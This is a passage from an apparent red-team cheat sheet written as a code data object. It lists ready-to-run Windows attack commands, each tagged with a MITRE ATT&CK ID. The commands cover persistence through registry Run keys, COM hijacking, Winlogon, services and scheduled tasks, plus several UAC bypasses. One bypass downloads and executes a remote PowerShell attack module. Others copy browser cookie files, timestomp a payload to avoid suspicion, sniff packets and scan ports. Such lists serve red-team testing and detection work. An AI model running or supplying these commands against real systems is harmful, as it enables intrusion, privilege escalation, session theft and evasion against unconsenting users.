            'cmd': 'reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\evil" /f;reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\evil" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f;reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\evil" /v StartEXE /t REG_SZ /d C:\\evil.exe /f;atbroker /start evil',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1546.008', 'url': 'https://attack.mitre.org/techniques/T1546/008/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Atbroker/',
            'desc': 'The command injects a malicious executable file path to the Assistive Technologies (AT).',
        },
        'Reg (COM Hijacking)': {
            'cmd': 'reg add "HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}" /f;reg add "HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32" /t REG_SZ /d "C:\\evil.dll" /f;reg add "HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Both" /f',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1546.015', 'url': 'https://attack.mitre.org/techniques/T1546/015/'},
            'lolbas': null,
            'desc': 'The command hijacks the MruPidList COM object to execute the evil.dll for persistence. To delete it, run \'reg delete "HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}"\' command.',
        },
        'Reg (Service)': {
            'cmd': 'reg add HKLM\\System\\CurrentControlSet\\Services\\<ExampleService> /v imagePath /t REG_EXPAND_SZ /d "C:\\evil.exe" /f',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1112', 'url': 'https://attack.mitre.org/techniques/T1112/'},
            'desc': 'The command modifies the image path of the service. Replace the \'<ExampleService>\' in the registry path with your target.',
        },
        'Reg (Recycle Bin)': {
            'cmd': 'reg add "HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command" /ve /d "C:\\evil.exe" /f',
            'cli': 'PowerShell',
            'adminRequired': true,
            'mitre': {'id': 'T1574.001', 'url': 'https://attack.mitre.org/techniques/T1547/001/'},
            'lolbas': null,
            'desc': 'The command adds arbitrary command execution to the Recycle bin (CLSID: 645FF040-5081-101B-9F08-00AA002F954E). The command will be executed when the Recycle Bin opens. To delete this setting, run \'reg delete "HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open" /f\' command.',
        },
        'Reg (Run, Unprivileged)': {
            'cmd': 'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MyTest /t REG_SZ /d "C:\\evil.exe" /f',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1547.001', 'url': 'https://attack.mitre.org/techniques/T1547/001/'},
            'lolbas': null,
            'desc': 'The commnad will cause arbitrary executable file or command to run when the current user logs on.',
        },
        'Reg (Run, Privileged)': {
            'cmd': 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MyTest /t REG_SZ /d "C:\\evil.exe" /f',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1547.001', 'url': 'https://attack.mitre.org/techniques/T1547/001/'},
            'lolbas': null,
            'desc': 'The commnad will cause arbitrary executable file or command to run when any user on the system logs on.',
        },
        'Reg (Winlogon)': {
            'cmd': 'reg add "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, C:\\evil.exe" /f',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1547.004', 'url': 'https://attack.mitre.org/techniques/T1547/004/'},
            'lolbas': null,
            'desc': 'The command makes the evil.exe to be executed when logon.',
        },
        'Sc (Config)': {
            'cmd': 'sc.exe config "Service Name" binPath= "C:\\evil.exe"',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1569.002', 'url': 'https://attack.mitre.org/techniques/T1569/002/'},
            'lolbas': null,
            'desc': 'The command modifies the binary path of the existing service. It may achieve persistence.',
        },
        'Sc (Create)': {
            'cmd': 'sc.exe create Evil binPath="C:\\evil.exe" start= auto',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1569.002', 'url': 'https://attack.mitre.org/techniques/T1569/002/'},
            'lolbas': null,
            'desc': 'The command creates a malicious service to execute the evil.exe when the system boots. To delete the service, run \'sc delete Evil\' command.',
        },
        'Schtasks': {
            'cmd': 'schtasks /Create /SC ONLOGON /TN "My Task" /TR C:\\evil.exe /RU SYSTEM',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1053.005', 'url': 'https://attack.mitre.org/techniques/T1053/005/'},
            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Schtasks/',
            'desc': null,
        },
    },
    'Privilege Escalation': {
        'PowerShell (Start-Process)': {
            'cmd': 'start powershell -Verb runAs',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': null,
            'lolbas': null,
            'desc': 'The command starts a PowerShell process as Administrator. The UAC prompt will open.',
        },
    },
    'Reveal ADS': {
        'Dir': {
            'cmd': 'cmd /c dir /r .\\file.txt',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
            'lolbas': null,
            'desc': 'The command reveals an information of Alternate Data Stream in arbitrary file (\'file.txt\').',
        },
    },
    'Scan Ports': {
        'PowerShell': {
            'cmd': '@(21,22,23,25,53,80,88,135,139,389,443,445,464,593,636,3000,3268,3269,3306,3389,5432,5900,5985,6379,8000,8080) | % {echo ((New-Object Net.Sockets.TcpClient).Connect("localhost",$_)) "Port $_ open"} 2>$null',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1046', 'url': 'https://attack.mitre.org/techniques/T1046/'},
            'lolbas': null,
            'desc': 'The command scans opening ports.',
        },
    },
    'Sniff Network': {
        'Pktmon': {
            'cmd': 'pktmon start --etw -f .\\trace.etl;timeout /t 5;pktmon stop;pktmon etl2pcap .\\trace.etl -o .\\trace.pcapng',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1040', 'url': 'https://attack.mitre.org/techniques/T1040/'},
            'lolbas': null,
            'desc': 'The commands capture packets in 5 seconds, then save and convert the saved file to the .pcapng file for analyzing with WireShark.',
        },
        'PowerShell': {
            'cmd': '$CaptureFile = "C:\\trace.etl";$PcapFile = "C:\\trace.pcapng";New-NetEventSession -Name EvilSniff -LocalFilePath $CaptureFile;Add-NetEventPacketCaptureProvider -SessionName EvilSniff -TruncationLength 100;Start-NetEventSession -Name EvilSniff;timeout /t 5;Stop-NetEventSession -Name EvilSniff;Remove-NetEventSession -Name EvilSniff;pktmon etl2pcap $CaptureFile -o $PcapFile',
            'cli': 'PowerShell',
            'adminRequired': true,
            'mitre': {'id': 'T1040', 'url': 'https://attack.mitre.org/techniques/T1040/'},
            'lolbas': null,
            'desc': 'The commands capture packets in 5 seconds, then save and convert the saved file to the .pcapng file for analyzing with WireShark.',
        },
    },
    'Steal Cookies': {
        'PowerShell': {
            'cmd': 'copy "$env:APPDATA\\Mozilla\\FireFox\\Profiles\\*\\cookies.sqlite" .\\cookies_firefox.sqlite;copy "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Network\\Cookies" .\\cookies_chrome.sqlite;copy "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies" .\\cookies_edge.sqlite',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1539', 'url': 'https://attack.mitre.org/techniques/T1539/'},
            'lolbas': null,
            'desc': 'The commands copies FireFox, Chrome and Microsoft Edge cookies to current directory. These files can be read using \'sqlite3\' or other dumping tools.',
        },
    },
    'Timestomp': {
        'PowerShell': {
            'cmd': 'Get-ChildItem .\\evil.exe | % {$_.CreationTime = "06/24/2022 05:03:18";$_.LastWriteTime = "06/24/2022 05:03:18"}',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1070.006', 'url': 'https://attack.mitre.org/techniques/T1070/006/'},
            'lolbas': null,
            'desc': 'The command changes the creation time and the last modified time of the file to prevent victims from becoming suspicious of this file.',
        },
    },
    'UAC Bypass': {
        'Computerdefaults': {
            'cmd': 'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /d "" /f;reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /ve /t REG_SZ /d "cmd.exe" /f;start computerdefaults.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1548.002', 'url': 'https://attack.mitre.org/techniques/T1548/002/'},
            'lolbas': null,
            'desc': 'If you run it on Command Prompt, replace \';\' with \'&\'.',
        },
        'EnableLUA': {
            'cmd': 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f',
            'cli': null,
            'adminRequired': true,
            'mitre': {'id': 'T1548.002', 'url': 'https://attack.mitre.org/techniques/T1548/002/'},
            'lolbas': null,
            'desc': 'The command disables UAC. To enable it, set 1 in the following command.',
        },
        'Eventvwr': {
            'cmd': 'reg add "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" /v DelegateExecute /t REG_SZ /d "" /f;reg add "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" /ve /t REG_SZ /d "cmd /c start cmd" /f;start eventvwr.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1548.002', 'url': 'https://attack.mitre.org/techniques/T1548/002/'},
            'lolbas': null,
            'desc': 'If you run it on Command Prompt, replace \';\' with \'&\'.',
        },
        'Fodhelper': {
            'cmd': 'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /ve /t REG_SZ /d "cmd.exe" /f;start fodhelper.exe',
            'cli': null,
            'adminRequired': false,
            'mitre': {'id': 'T1548.002', 'url': 'https://attack.mitre.org/techniques/T1548/002/'},
            'lolbas': null,
            'desc': 'If you run it on Command Prompt, replace \';\' with \'&\'.',
        },
        'PowerShell (WinPwn)': {
            'cmd': 'IEX(New-Object Net.Webclient).DownloadString(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1\');UACBypass -noninteractive -command "C:\\evil.exe" -technique ccmstp',
            'cli': 'PowerShell',
            'adminRequired': false,
            'mitre': {'id': 'T1548.002', 'url': 'https://attack.mitre.org/techniques/T1548/002/'},
            'lolbas': null,
            'desc': 'The command imports the WinPwn module and executes arbitrary command while bypassing UAC.',
        },
    },
};
